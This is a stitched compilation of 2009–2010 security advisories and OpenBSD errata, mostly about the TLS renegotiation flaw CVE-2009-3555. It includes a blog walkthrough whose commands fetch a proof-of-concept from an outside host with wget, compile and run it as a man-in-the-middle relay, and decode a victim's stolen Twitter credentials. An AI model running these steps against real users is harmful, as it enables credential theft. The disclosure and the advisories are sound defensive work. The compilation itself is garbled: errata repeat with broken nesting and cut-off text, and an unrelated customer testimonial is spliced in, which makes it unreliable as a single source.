* **001: RELIABILITY FIX: July 29, 2009**
    *All architectures*

  A vulnerability has been found in BIND's named server
  ([CVE-2009-0696](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-0696)).
  An attacker could crash a server with a specially crafted dynamic update message to a
  zone for which the server is master.

  [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/4.6/common/001_bind.patch)

  * **002: RELIABILITY FIX: October 05, 2009**
      *i386 only*

    XMM exceptions are not correctly handled resulting in a kernel panic.

    [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/4.6/i386/002_xmm.patch)

    * **003: RELIABILITY FIX: October 28, 2009**
        *All architectures*

      getsockopt(2) with any of IP\_AUTH\_LEVEL, IP\_ESP\_TRANS\_LEVEL, IP\_ESP\_NETWORK\_LEVEL,
      IP\_IPCOMP\_LEVEL will crash the system.

      [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/4.6/common/003_getsockopt.patch)

      * **004: SECURITY FIX: November 26, 2009**
          *All architectures*

        The SSL/TLS protocol is subject to man-in-the-middle attacks related to
        renegotiation (see CVE-2009-3555, draft-ietf-tls-renegotiation-00).
        OpenSSL permitted this protocol feature by default and had no way to
        disable it.

        [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/4.6/common/004_openssl.patch)

        * **005: RELIABILITY FIX: January 29, 2010**
            *All architectures*

          By using ptrace(2) on an ancestor process, a loop in the process tree
          could be created, violating assumptions in other parts of the kernel
          and resulting in infinite loops.

          [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/4.6/common/005_ptrace.patch)

          * **006: SECURITY FIX: March 12, 2010**
              *All architectures*

            OpenSSL is susceptible to a buffer overflow due to a failure
            to check for NULL returns from bn\_wexpand function calls.

            [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/4.6/common/006_openssl.patch)

            * **007: RELIABILITY FIX: March 12, 2010**
                *All architectures*

              Due to a null pointer dereference, it would be possible to crash ftpd when
              handling glob(3)'ing requests. This is non-exploitable.

              [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/4.6/common/007_ftpd.patch)

              * **008: RELIABILITY FIX: March 31, 2010**
                  *All architectures*

                When decrypting packets, the internal decryption functions were not
                paranoid enough in checking for underruns, which could potentially
                lead to crashes.

                [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/4.6/common/008_kerberos.patch)

                * **009: RELIABILITY FIX: April 4, 2010**
                    *All architectures*

                  When updating sensors showing the state of RAID volumes
                  [mpi(4)](https://man.openbsd.org/OpenBSD-4.6/mpi.4)
                  allocates temporary memory and then returns it to the kernel as
                  device memory.
                  This causes kernel memory usage to be misrepresented, eventually
                  leading to a denial of service when a resource limit is apparently
                  reached.

                  [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/4.6/common/009_mpi.patch)

                  * **010: SECURITY FIX: April 14, 2010**
                      *All architectures*

                    In TLS connections, certain incorrectly formatted records can cause
                    an OpenSSL client or server to crash due to a read attempt at NULL.

                    [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/4.6/common/010_openssl.patch)

                    * **011: RELIABILITY FIX: May 14, 2010**
                        *All architectures*

                      Incorrectly initialized state updates can cause pfsync update storms.

                      [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/4.6/common/011_pfsync.patch)

                      * **012: RELIABILITY FIX: May 14, 2010**
                          *All architectures*

                        Insufficient protection of the trunk interface queues may cause
                        LACP trunks to fail under load.

                        [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/4.6/common/012_trunklacp.patch)

### TLS renegotiation vulnerability (CVE-2009-3555)

definitely not a full blown MITM, yet more than just a simple CSRF

UPDATE: This article was featured on [The Register](http://www.theregister.co.uk/2009/11/14/ssl_renegotiation_bug_exploited/)

Context

Marsh Ray and Steve Dispensa have [recently uncovered](http://extendedsubset.com/?p=8) a vulnerability in the design of TLS. [Many comments](http://www.ietf.org/mail-archive/web/tls/current/threads.html#03963) and [explanations](http://www.educatedguesswork.org/2009/11/understanding_the_tls_renegoti.html) have been made, and the consensus is that for HTTPS, this attack is equivalent to a CSRF, which is usually well protected against.

From [IBM ISS](http://blogs.iss.net/archive/sslmitmiscsrf.html):

> Most, if not all, major web applications have implementation level protections against CSRF, such as random nonces in web forms that must be submitted along with any request. Those protection measures are effective against this new SSL man in the middle attack. Therefore, this vulnerability has minimal security impact for most websites and Internet users.

UPDATE: Tom J Cross from IBM ISS made a [follow-up blog post](http://blogs.iss.net/archive/stealingcookieswiths.html) referring to this attack.

This is about right if one considers the way an attacker injects data in the TLS session (in red) according to Marsh Ray's "X-ignore" trick:

GET /transact.php?value=evil HTTP/1.0

X-Ignore: Get / HTTP/1.1

Cookie: [...]

This is not the only possibility though. Here is another one:

POST /forum/send.php HTTP/1.0

message=GET / HTTP/1.1 [...]

Now the victim's packet is embedded in the POST data. The attacker can therefore have access to the actual packet sent by an auxiliary channel - e.g. here by reading the posted message on the forum that we assume operates on the same website.

One can see here that this is somewhat broader than a CSRF: an attacker can now have access to HTTP headers, such as the Authorization header.

A real world attack scenario: the twitter API

One can update its twitter status by using their RESTful API, e.g. with curl:

$ curl -u "user:pw" -d "status=New status" https://twitter.com/statuses/update.xml

Note that this is a POST request. Applying the previously stated idea, it is now possible to access the first 140 characters of an HTTP packet sent by a victim.

Attacker:

attacker.example.com$ wget http://perso.telecom-paristech.fr/~kurmus/ssl.c #based on the PoC published on full disclosure

attacker.example.com$ gcc -lssl ssl.c -o ssl

attacker.example.com$ ./ssl 8080 `echo -n "attacker@example.com:evilpw" |base64`

Victim:

$ curl -u "victim@example.com:securepw" -d "status=any" https://twitter.com/statuses/update.xml -p -x attacker.example.com:8080 \

# proxying the request through attacker.example.com, to simulate a MITM

Result on the attacker's twitter status:

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhDESMAFQ3WiKMPD3WKdnSwmVVYueHbXJsxSj_59KqL2Um50Q0-A0Z1SbnqqHcjuxJ8tTo2yGk3l-YqAv1Y6Ti290A6F4h9YyvLJ7SHOooyZj6n0fCGrUXRzbtRRTZC_hHkTbaFpUgRt6I/s320/mitm.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhDESMAFQ3WiKMPD3WKdnSwmVVYueHbXJsxSj_59KqL2Um50Q0-A0Z1SbnqqHcjuxJ8tTo2yGk3l-YqAv1Y6Ti290A6F4h9YyvLJ7SHOooyZj6n0fCGrUXRzbtRRTZC_hHkTbaFpUgRt6I/s1600-h/mitm.png)

$ echo -n dmljdGltQGV4YW1wbGUuY29tOnNlY3VyZXB3 | base64 -d

victim@example.com:securepw

Although the attacker cannot modify the contents of the data sent back by the server after the malicious status update, he can take advantage of his relaying position and drop that packet. Considering twitter will also append an authentication cookie in the reply, this is a must for the attacker.

All in all, a man in the middle is able to steal the credentials of a user authenticating himself through HTTPS to a trusted website, and CSRF protections do not apply here. Luckily, a [fix should be out soon](https://datatracker.ietf.org/drafts/draft-rescorla-tls-renegotiation/).

   UPDATE: it appears twitter has patched its webserver and the TLS renegotiation vulnerability does not work anymore. Until yesterday (10/11), it was working fine. I guess their admins are doing a good job!

   Please note that the RESTful API is not (and cannot) protected against CSRF because it is a single request. In the GET /transact.php?value=evil case CSRF protection can be defeated if it uses an HTTP header, but not if it uses a URL parameter. In the POST /forum/send.php case CSRF protection is never defeated.

   So, the impact of this SSL flaw is still similar to CSRF. You just pointed out a case where CSRF is not implemented.

   Thanks RichieB for your comment, I agree this is not vey clear in my post.

   Do you agree with the following: if you were to try to exploit the twitter API through a CSRF, you would not be able to perform this attack.
   The reason is related to the one you mentioned: this is a single request that has to contain the user's credentials. If the CSRF POST would include the attacker's credentials (I'm not sure whether this would actually work, but I'd guess so, with some javascript), the attacker has no way to access the victim's credentials and post them. Nor his twitter.com cookies.

   Therefore, it is possible to perform attacks with this vulnerability that you could not with some CSRF.

   CSRF doesn't work on Twitter during a POST because of the protection provided by the rails authenticity token.

   @Anonymous: RichieB and I were referring to the RESTful API (no token there)

   This isn't a renegotiation exploit at all. This is just a CSRF leveraging MitM. The attack doesn't even cause a renegotiation. While the attack is certainly clever, it is misleading to call it a renegotiation exploit.

   @Anonymous2:
   Renegotiation:
    *cssl->ssl->method->ssl3\_enc->change\_cipher\_state = bogus\_change\_cipher\_state;
    rec\_write(cssl, buf, l);*

   Also, CSRF starts with "Cross Site". There is only one web server involved here.

   I still don't see why this is anything like a CSRF at all.

   The attacker doesn't need to convince the service provider to trust the user's request. The attacker doesn't try to impersonate the user at all!

   The attacker only needs to convince the service provider to trust the \*attacker's request\*. He can use his own login credentials. He can provide whatever CSRF-protection cookies the service requires. All he has to do is construct \*some\* valid request that ends with the user's original HTTP request as \*some\* valid payload that the service provider will eventually make available to him.

   In other words, the service provider only sees the attacker logging in normally, following a normal sequence of web forms, and posting a message with a funny-looking body. No CSRF.

   Hi Joe,

   Thanks for the comment, this is my point of view as well. Token based CSRF won't be of any use - in the specific way of exploiting the TLS bug here - to prevent the attacker from posting... authenticated as himself.

   The comparison with CSRF though is based on the initial "X-ignore" trick, which led to basically the same result that you would get from a CSRF, making CSRF protections more relevant in that case.

    Right; I think it's valuable to separate the two different attack cases more explicitly:

    1) Bad guy plays chosen transaction under authentication of good guy;

    2) Bad guy reveals good guy's plaintext through posting under bad guys' credentials.

    We had considered both, but we thought #1 was the more serious flaw, and more directly illustrated the actual protocol flaw.

    I'm curious: would OAuth be better than simply base64'ing the user's password?

    OAuth and TLS have very different uses and if the question is whether, in general, the use of OAuth would mitigate the vulnerability, the answer is no. However, OAuth would indeed prevent disclosing the user's credentials to the attacker in the case of the twitter API here, but so would using Digest instead of Basic authorization. Does that answer your question?

    Hi there, I'm getting the message "potentially vulnerable to CVE-2009-3555" - do I need to get my provider to patch my server or is this a code issue? I force SSL over the whole of my sote and I'm now getting pretty worried. Any ideas?

* **001: RELIABILITY FIX: April 8, 2009**
    *All architectures*

  The OpenSSL ASN.1 handling code could be forced to perform invalid memory
  accesses through the use of certain invalid strings
  ([CVE-2009-0590](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-0590))
  or under certain error conditions triggerable by invalid ASN.1 structures
  ([CVE-2009-0789](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-0789)).
  These vulnerabilities could be exploited to achieve a
  denial-of-service. A more detailed description of these problems is available
  in the
  [OpenSSL security advisory](http://www.openssl.org/news/secadv_20090325.txt), but note that the other issue described there "Incorrect Error
  Checking During CMS verification" relates to code not enabled in OpenBSD.

  [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/4.5/common/001_openssl.patch)

  * **002: RELIABILITY FIX: April 11, 2009**
      *All architectures*

    When pf attempts to perform translation on a specially crafted IP datagram,
    a null pointer dereference will occur, resulting in a kernel panic.
    In certain configurations this may be triggered by a remote attacker.

    Restricting translation rules to protocols that are specific to the IP version
    in use, is an effective workaround until the patch can be installed. As an
    example, for IPv4 nat/binat/rdr rules you can use:
    ```

        nat/rdr ... inet proto { tcp udp icmp } ...

    ```
    Or for IPv6 nat/binat/rdr rules you can use:
    ```

        nat/rdr ... inet6 proto { tcp udp icmp6 } ...

    ```

    * **003: RELIABILITY FIX: April 24, 2009**
        *i386 only*

      When DMA'able memory is mapped by device drivers, the
      mapping flags and protection are partially uninitialized.
      Depending on the calling context, this may cause devices to misbehave, like
      [audio(4)](https://man.openbsd.org/OpenBSD-4.5/audio.4)
      to stutter, but other anomalies might be observed for other
      device types.

      * **004: RELIABILITY FIX: April 24, 2009**
          *All architectures*

        In server mode when in full-duplex mode (the default)
        [aucat(1)](https://man.openbsd.org/OpenBSD-4.5/aucat.1)
        will send each synchronization message twice, causing client applications
        to think that buffer underruns are occurring. Depending on the
        application, this may cause the sound to stutter.

        [A source code patch exists which remedies this problem.](https://ftp.openbsd.org/pub/OpenBSD/patches/4.5/common/004_aucat.patch)

        * **005: RELIABILITY FIX: April 24, 2009**
            *All architectures*

          On very high system load, an audio interrupt may occur while the
          audio process is filling audio ring buffers. This triggers bogus
          (and useless) correction code in the
          [audio(4)](https://man.openbsd.org/OpenBSD-4.5/audio.4)
          driver causing the audio application to go out of sync, and in turn causing
          continuous stuttering until the application is restarted.

          * **006: RELIABILITY FIX: June 24, 2009**
              *All architectures*

            An off-by-one error in the inflate function in Zlib.xs in the
            Compress::Raw::Zlib perl module before 2.017 ([CVE-2009-1391](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-1391)),
            as used in AMaViS, SpamAssassin, and possibly other products,
            allows context-dependent attackers to cause a denial of service
            (hang or crash) via a crafted zlib compressed stream that
            triggers a heap-based buffer overflow.

                *All architectures*

              A vulnerability has been found in BIND's named server
              ([CVE-2009-0696](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-0696)).
              An attacker could crash a server with a specially crafted dynamic update message to a
              zone for which the server is master.

                    The SSL/TLS protocol is subject to man-in-the-middle attacks related to
                    renegotiation (see CVE-2009-3555, draft-ietf-tls-renegotiation-00).
                    OpenSSL permitted this protocol feature by default and had no way to
                    disable it.

                      By using ptrace(2) on an ancestor process, a loop in the process tree
                      could be created, violating assumptions in other parts of the kernel
                      and resulting in infinite loops.

                        OpenSSL is susceptible to a buffer overflow due to a failure
                        to check for NULL returns from bn\_wexpand function calls.

                          Due to a null pointer dereference, it would be possible to crash ftpd when
                          handling glob(3)'ing requests. This is non-exploitable.

                            When decrypting packets, the internal decryption functions were not
                            paranoid enough in checking for underruns, which could potentially
                            lead to crashes.

                              When updating sensors showing the state of RAID volumes
                              [mpi(4)](https://man.openbsd.org/OpenBSD-4.5/mpi.4)
                              allocates temporary memory and then returns it to the kernel as
                              device memory.
                              This causes kernel memory usage to be misrepresented, eventually
                              leading to a denial of service when a resource limit is apparently
                              reached.

                                In TLS connections, certain incorrectly formatted records can cause

# RHSA-2010:0770 - Security Advisory

* [Overview](#overview)

## Synopsis

Critical: java-1.6.0-sun security update

## Type/Severity

Security Advisory: Critical

## Topic

Updated java-1.6.0-sun packages that fix several security issues are now
available for Red Hat Enterprise Linux 4 Extras and 5 Supplementary.

The Red Hat Security Response Team has rated this update as having critical
security impact. Common Vulnerability Scoring System (CVSS) base scores,
which give detailed severity ratings, are available for each vulnerability
from the CVE links in the References section.

## Description

The Sun 1.6.0 Java release includes the Sun Java 6 Runtime Environment and
the Sun Java 6 Software Development Kit.

This update fixes several vulnerabilities in the Sun Java 6 Runtime
Environment and the Sun Java 6 Software Development Kit. Further
information about these flaws can be found on the "Oracle Java SE and Java
for Business Critical Patch Update Advisory" page, listed in the References
section. (CVE-2010-1321, CVE-2010-3541, CVE-2010-3548, CVE-2010-3549,
CVE-2010-3550, CVE-2010-3551, CVE-2010-3552, CVE-2010-3553, CVE-2010-3554,
CVE-2010-3555, CVE-2010-3556, CVE-2010-3557, CVE-2010-3558, CVE-2010-3559,
CVE-2010-3560, CVE-2010-3561, CVE-2010-3562, CVE-2010-3563, CVE-2010-3565,
CVE-2010-3566, CVE-2010-3567, CVE-2010-3568, CVE-2010-3569, CVE-2010-3570,
CVE-2010-3571, CVE-2010-3572, CVE-2010-3573, CVE-2010-3574)

The RHSA-2010:0337 update mitigated a man-in-the-middle attack in the way
the TLS/SSL (Transport Layer Security/Secure Sockets Layer) protocols
handle session renegotiation by disabling renegotiation. This update
implements the TLS Renegotiation Indication Extension as defined in RFC
5746, allowing secure renegotiation between updated clients and servers.
(CVE-2009-3555)

Users of java-1.6.0-sun should upgrade to these updated packages, which
correct these issues. All running instances of Sun Java must be restarted
for the update to take effect.

## Solution

Before applying this update, make sure all previously-released errata
relevant to your system have been applied.

This update is available via the Red Hat Network. Details on how to
use the Red Hat Network to apply this update are available at
<http://kbase.redhat.com/faq/docs/DOC-11259>

## Details

Marsh Ray and Steve Dispensa discovered a flaw in the TLS and SSLv3

protocols. If an attacker could perform a machine-in-the-middle attack at the

start of a TLS connection, the attacker could inject arbitrary content

at the beginning of the user's session. ([CVE-2009-3555](/security/CVE-2009-3555))

It was discovered that Loader-constraint table, Policy/PolicyFile,

Inflater/Deflater, drag/drop access, and deserialization did not correctly

handle certain sensitive objects. If a user were tricked into running a

specially crafted applet, private information could be leaked to a remote

attacker, leading to a loss of privacy. ([CVE-2010-0082](/security/CVE-2010-0082), [CVE-2010-0084](/security/CVE-2010-0084),

[CVE-2010-0085](/security/CVE-2010-0085), [CVE-2010-0088](/security/CVE-2010-0088), [CVE-2010-0091](/security/CVE-2010-0091), [CVE-2010-0094](/security/CVE-2010-0094))

It was discovered that AtomicReferenceArray, System.arraycopy,

InetAddress, and HashAttributeSet did not correctly handle certain

situations. If a remote attacker could trigger specific error conditions,

a Java application could crash, leading to a denial of service.

([CVE-2010-0092](/security/CVE-2010-0092), [CVE-2010-0093](/security/CVE-2010-0093), [CVE-2010-0095](/security/CVE-2010-0095), [CVE-2010-0845](/security/CVE-2010-0845))

It was discovered that Pack200, CMM readMabCurveData, ImagingLib, and

the AWT library did not correctly check buffer lengths. If a user or

automated system were tricked into handling specially crafted JAR files or

images, a remote attacker could crash the Java application or possibly

gain user privileges ([CVE-2010-0837](/security/CVE-2010-0837), [CVE-2010-0838](/security/CVE-2010-0838), [CVE-2010-0847](/security/CVE-2010-0847),

[CVE-2010-0848](/security/CVE-2010-0848)).

It was discovered that applets did not correctly handle certain trust

chains. If a user were tricked into running a specially crafted applet,

a remote attacker could possibly run untrusted code with user privileges.

([CVE-2010-0840](/security/CVE-2010-0840))

Subject: CVE-2009-3555 - apache/mod_ssl vulnerability and mitigation

Apache httpd is affected by CVE-2009-3555[[1]](#1) (The SSL Injection
or MiM attack[[2]](#2)).

The Apache httpd webserver relies on OpenSSL for the implementation of
the SSL/TLS protocol.

We strongly urge you to upgrade to OpenSSL 0.9.8l; and to be prepared
to deploy OpenSSL 0.9.8m as it becomes available[[3]](#3).

Note that these are for short term and mid-term mitigation only; the
long term solution may well require a modification of the SSL and/or
TLS protocols[[4]](#4).

For those who are not able to upgrade OpenSSL swiftly and/or for
those who need detailed logging - we recommend that you roll out
this patch[[5]](#5):

  <http://www.apache.org/dist/httpd/patches/>
       apply_to_2.2.14 CVE-2009-3555-2.2.patch
 sha1: 28cd58f3758f1add39417333825b9d854f4f5f43

as soon as possible. This is a partial fix in lieu of the protocol
issues being addressed and further changes to OpenSSL. Like the
OpenSSL 0.9.8l stopgap measure this patch rejects
in-session renegotiation.

If you are unable to patch and unable to roll our a newer version of
OpenSSL, and you rely on Client Side Authentication with Certificates
then we recommend that you 1) ensure that you limit your configuration
to a single 'SSLClient require' on VirtualHost/Sever level and 2)
remove all other (re)negotiation/require directives. However this does
NOT fully protect you - it just curtails authentication in this
specific setting.

1) Solved Security Vulnerabilities
To avoid flooding mailing lists with SUSE Security Announcements for minor
issues, SUSE Security releases weekly summary reports for the low profile
vulnerability fixes. The SUSE Security Summary Reports do not list or
download URLs like the SUSE Security Announcements that are released for
more severe vulnerabilities.
Fixed packages for the following incidents are already available on our FTP
server and via the YaST Online Update.
- evolution-data-server
- evolution considered S/MIME signatures to be valid even for modified
mails (CVE-2009-0547: CVSS v2 Base Score: 5.0)
- specially crafted base64 encoded messages could cause a heap buffer
overflow (CVE-2009-0587: CVSS v2 Base Score: 7.5)
- a POP3 server sending overly long lines could crash evolution
Affected Products: SLE10-SP3, SLE11, openSUSE 11.0
- python/libpython2\_6-1\_0
This update of python has a copy of libxmlrpc that is vulnerable to denial
of service bugs that can occur while processing malformed XML input.

3) Authenticity Verification and Additional Information
- Announcement authenticity verification:
SUSE security announcements are published via mailing lists and on Web
sites. The authenticity and integrity of a SUSE security announcement is
guaranteed by a cryptographic signature in each announcement. All SUSE
security announcements are published with a valid signature.
To verify the signature of the announcement, save it as text into a file
and run the command
gpg --verify <file>
replacing <file> with the name of the file containing the announcement.
The output for a valid signature looks like:
gpg: Signature made <DATE> using RSA key ID 3D25D3D9
gpg: Good signature from "SuSE Security Team <security@suse.de>"
where <DATE> is replaced by the date the document was signed.
If the security team's key is not contained in your key ring, you can
import it from the first installation CD. To import the key, use the
command
gpg --import gpg-pubkey-3d25d3d9-36e12d04.asc
- Package authenticity verification:
SUSE update packages are available on many mirror FTP servers all over the
world. While this service is considered valuable and important to the free
and open source software community, the authenticity and integrity of a
package needs to be verified to ensure that it has not been tampered with.
The internal RPM package signatures provide an easy way to verify the
authenticity of an RPM package. Use the command
rpm -v --checksig <file.rpm>
to verify the signature of the package, replacing <file.rpm> with the
filename of the RPM package downloaded. The package is unmodified if it
contains a valid signature from build@suse.de with the key ID 9C800ACA.
This key is automatically imported into the RPM database (on RPMv4-based
distributions) and the gpg key ring of 'root' during installation. You can
also find it on the first installation CD and included at the end of this
announcement.
- SUSE runs two security mailing lists to which any interested party may
subscribe:
opensuse-security@opensuse.org
- General Linux and SUSE security discussion.
All SUSE security announcements are sent to this list.
To subscribe, send an e-mail to
<opensuse-security+subscribe@opensuse.org>.
opensuse-security-announce@opensuse.org
- SUSE's announce-only mailing list.
Only SUSE's security announcements are sent to this list.
To subscribe, send an e-mail to
<opensuse-security-announce+subscribe@opensuse.org>.
=====================================================================
SUSE's security contact is <security@suse.com> or <security@suse.de>.
The <security@suse.de> public key is listed below.

Sorry for jumping in, but I had missed the topic in the other lists,
so I am trying to ask here.  Also CC'ing tls@...f.org -- sorry for
such cross-posting.

Had anyone considered the scenario when the server requires client
certificate from the beginning, but MITM possesses some other
credentials that will be good for authentication (but can be of no use
for authorization)?  In this case MITM can use this certificate to start
the splitting request, then initiate renegotiation and proxy client's
request through the established channel.  I see that Apache asks for the
certificate for the second renegotiation, as well as the OpenSSL's
s_server.  Here is the trace for s_server:
-----
$ openssl s_client -msg -key userkey.pem -cert usercert.pem -host somehost -port 8443 | grep -E '^(<<<|>>>)'
Enter pass phrase for userkey.pem:
>>> SSL 2.0 [length 0086], CLIENT-HELLO
<<< TLS 1.0 Handshake [length 004a], ServerHello
<<< TLS 1.0 Handshake [length 0b01], Certificate

<<< TLS 1.0 Handshake [length 060a]???
<<< TLS 1.0 ChangeCipherSpec [length 0001]
<<< TLS 1.0 Handshake [length 0010], Finished
-----
If the second certificate is used for the authorization and it is
allowed to have distinct certificates during the first and second
negotiations, then this could be the other way to trigger this attack
against the servers that are requiring certificates from the beginning.

Any thoughts?

> I like the fact that they really dig into things and then provide answers. As the single Linux guy, I kind of need that second admin next to me sometimes to say, "Hey, what about this?" and I am able to do that through the portal. I get my questions answered and trouble tickets resolved.

Debian Security Advisory DSA-1934-1                  security@debian.org
<http://www.debian.org/security/>                           Stefan Fritsch
November 16, 2009                     <http://www.debian.org/security/faq>
- ------------------------------------------------------------------------

Package        : apache2
Vulnerability  : multiple issues
Problem type   : remote
Debian-specific: no
CVE Id(s)      : CVE-2009-3094 CVE-2009-3095 CVE-2009-3555

A design flaw has been found in the TLS and SSL protocol that allows
an attacker to inject arbitrary content at the beginning of a TLS/SSL
connection. The attack is related to the way how TLS and SSL handle
session renegotiations. CVE-2009-3555 has been assigned to this
vulnerability.

As a partial mitigation against this attack, this apache2 update
disables client-initiated renegotiations. This should fix the
vulnerability for the majority of Apache configurations in use.

NOTE: This is not a complete fix for the problem. The attack is
still possible in configurations where the server initiates the
renegotiation. This is the case for the following configurations
(the information in the changelog of the updated packages is
slightly inaccurate):

- - The "SSLVerifyClient" directive is used in a Directory or Location
  context.
- - The "SSLCipherSuite" directive is used in a Directory or Location
  context.

As a workaround, you may rearrange your configuration in a way that
SSLVerifyClient and SSLCipherSuite are only used on the server or
virtual host level.

A complete fix for the problem will require a protocol change. Further
information will be included in a separate announcement about this
issue.

In addition, this update fixes the following issues in Apache's
mod_proxy_ftp:

CVE-2009-3094: Insufficient input validation in the mod_proxy_ftp
module allowed remote FTP servers to cause a denial of service (NULL
pointer dereference and child process crash) via a malformed reply to
an EPSV command.

CVE-2009-3095: Insufficient input validation in the mod_proxy_ftp
module allowed remote authenticated attackers to bypass intended access
restrictions and send arbitrary FTP commands to an FTP server.

For the stable distribution (lenny), these problems have been fixed in
version 2.2.9-10+lenny6. This version also includes some non-security
bug fixes that were scheduled for inclusion in the next stable point
release (Debian 5.0.4).

The oldstable distribution (etch), these problems have been fixed in
version 2.2.3-4+etch11.

For the testing distribution (squeeze) and the unstable distribution
(sid), these problems will be fixed in version 2.2.14-2.

This advisory also provides updated apache2-mpm-itk packages which
have been recompiled against the new apache2 packages.

Updated apache2-mpm-itk packages for the armel architecture are not
included yet. They will be released as soon as they become available.

We recommend that you upgrade your apache2 and apache2-mpm-itk packages.

Upgrade instructions
- --------------------

wget url
        will fetch the file for you
dpkg -i file.deb
        will install the referenced file.

If you are using the apt-get package manager, use the line for
sources.list as given below:

apt-get update
        will update the internal database
apt-get upgrade
        will install corrected packages

You may use an automated update by adding the resources from the
footer to the proper configuration.

## Details

Marsh Ray and Steve Dispensa discovered a flaw in the TLS and

SSLv3 protocols. If an attacker could perform a machine-in-the-middle

attack at the start of a TLS connection, the attacker could inject

arbitrary content at the beginning of the user's session. USN-923-1

disabled SSL/TLS renegotiation by default; this update implements

the TLS Renegotiation Indication Extension as defined in RFC 5746,

and thus supports secure renegotiation between updated clients and

servers. ([CVE-2009-3555](/security/CVE-2009-3555))

It was discovered that the HttpURLConnection class did not validate

request headers set by java applets, which could allow an attacker to

trigger actions otherwise not allowed to HTTP clients. ([CVE-2010-3541](/security/CVE-2010-3541))

It was discovered that JNDI could leak information that would allow an

attacker to to access information about otherwise-protected internal

network names. ([CVE-2010-3548](/security/CVE-2010-3548))

It was discovered that HttpURLConnection improperly handled the

"chunked" transfer encoding method, which could allow attackers to

conduct HTTP response splitting attacks. ([CVE-2010-3549](/security/CVE-2010-3549))

It was discovered that the NetworkInterface class improperly

checked the network "connect" permissions for local network

addresses. This could allow an attacker to read local network

addresses. ([CVE-2010-3551](/security/CVE-2010-3551))

It was discovered that UIDefault.ProxyLazyValue had unsafe reflection

usage, allowing an attacker to create objects. ([CVE-2010-3553](/security/CVE-2010-3553))

It was discovered that multiple flaws in the CORBA reflection

implementation could allow an attacker to execute arbitrary code by

misusing permissions granted to certain system objects. ([CVE-2010-3554](/security/CVE-2010-3554))

It was discovered that unspecified flaws in the Swing library could

allow untrusted applications to modify the behavior and state of

certain JDK classes. ([CVE-2010-3557](/security/CVE-2010-3557))

It was discovered that the privileged accept method of the ServerSocket

class in the CORBA implementation allowed it to receive connections

from any host, instead of just the host of the current connection.

An attacker could use this flaw to bypass restrictions defined by

network permissions. ([CVE-2010-3561](/security/CVE-2010-3561))

It was discovered that there exists a double free in java's

indexColorModel that could allow an attacker to cause an applet

or application to crash, or possibly execute arbitrary code

with the privilege of the user running the java applet or

application. ([CVE-2010-3562](/security/CVE-2010-3562))

It was discovered that the Kerberos implementation improperly checked

AP-REQ requests, which could allow an attacker to cause a denial of

service against the receiving JVM. ([CVE-2010-3564](/security/CVE-2010-3564))

It was discovered that improper checks of unspecified image metadata in

JPEGImageWriter.writeImage of the imageio API could allow an attacker

to execute arbitrary code with the privileges of the user running a

java applet or application. ([CVE-2010-3565](/security/CVE-2010-3565))

It was discovered that an unspecified vulnerability in the ICC

profile handling code could allow an attacker to execute arbitrary

code with the privileges of the user running a java applet or

application. ([CVE-2010-3566](/security/CVE-2010-3566))

It was discovered that a miscalculation in the OpenType font rendering

implementation would allow out-of-bounds memory access. This could

allow an attacker to execute arbitrary code with the privileges of

the user running a java application. ([CVE-2010-3567](/security/CVE-2010-3567))

It was discovered that an unspecified race condition in the way

objects were deserialized could allow an attacker to cause an applet

or application to misuse the privileges of the user running the java

applet or application. ([CVE-2010-3568](/security/CVE-2010-3568))

It was discovered that the defaultReadObject of the Serialization

API could be tricked into setting a volatile field multiple times.

This could allow an attacker to execute arbitrary code with the

privileges of the user running a java applet or application.

([CVE-2010-3569](/security/CVE-2010-3569))

It was discovered that the HttpURLConnection class did not validate

request headers set by java applets, which could allow an attacker to

trigger actions otherwise not allowed to HTTP clients. ([CVE-2010-3573](/security/CVE-2010-3573))

It was discovered that the HttpURLConnection class improperly checked

whether the calling code was granted the "allowHttpTrace" permission,

allowing an attacker to create HTTP TRACE requests. ([CVE-2010-3574](/security/CVE-2010-3574))

# Microsoft Security Bulletin MS10-049 - Critical

## Vulnerabilities in SChannel could allow Remote Code Execution (980436)

Published: August 10, 2010 | Updated: September 01, 2010

**Version:** 1.1

### General Information

#### Executive Summary

This security update resolves one publicly disclosed vulnerability and one privately reported vulnerability in the Secure Channel (SChannel) security package in Windows. The more severe of these vulnerabilities could allow remote code execution if a user visits a specially crafted Web site that is designed to exploit these vulnerabilities through an Internet Web browser. In all cases, however, an attacker would have no way to force users to visit these Web sites. Instead, an attacker would have to convince users to visit the Web site, typically by getting them to click a link in an e-mail message or in an Instant Messenger message that takes users to the attacker's Web site.

This security update is rated Critical for all supported editions of Windows XP and Windows Server 2003; and Important for all supported editions of Windows Vista, Windows Server2008, Windows 7, and Windows Server 2008 R2. For more information, see the subsection, **Affected and Non-Affected Software**, in this section.

The security update addresses the vulnerabilities by implementing RFC 5746 and additional validation on SSL responses returned by a server. For more information about the vulnerabilities, see the Frequently Asked Questions (FAQ) subsection for the specific vulnerability entry under the next section, **Vulnerability Information**.

This security update also addresses a vulnerability first described in [Microsoft Security Advisory 977377](https://technet.microsoft.com/security/advisory/977377).

